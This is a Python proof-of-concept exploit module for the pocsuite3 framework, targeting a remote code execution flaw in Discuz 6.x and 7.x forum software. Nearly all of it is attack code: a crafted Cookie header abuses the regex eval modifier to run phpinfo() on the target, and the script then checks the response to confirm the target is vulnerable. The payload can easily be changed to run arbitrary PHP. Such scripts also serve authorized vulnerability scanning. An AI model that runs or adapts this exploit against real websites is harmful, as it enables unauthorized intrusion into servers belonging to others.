from pocsuite3.api import Output,POCBase,register_poc,requests

class Discuz(POCBase):
	vulID = '1002'
	version = '1.0'
	author = ['一寸一叶']
	vulDate = '2010'
	createDate = '2020-11-20'
	updateDate = '2020-11-20'
	name = 'Discuz 6.x 7.x rce (wooyun-2010-080723)'
	appPowerLink = 'https://www.discuz.net/forum.php'  # 漏洞产商主页
	appName = 'Discuz'  # 漏洞应用名称
	appVersion = '6.x 7.x'  # 漏洞影响版本
	vulType = 'RCE'  # 漏洞类型
	desc = '''任意一篇文章处修改cookie为：GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();可以命令执行'''  # 在漏洞描述填写
	samples = []  # 测试成功网址
	install_requires = []  # PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
	pocDesc = '''-u 指定的是文章地址'''  # 在PoC用法描述填写

	def _verify(self):
		result = {}
		payload = {
			'Cookie':'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
		}
		res = requests.get(self.url,headers=payload)
		if 'phpinfo()' in res.text:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = self.url 
			result['VerifyInfo']['Postdata'] =  payload
		return self.parse_output(result)
	def _attack(self):
		return	self._verify()
	def parse_output(self,result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return result
register_poc(Discuz)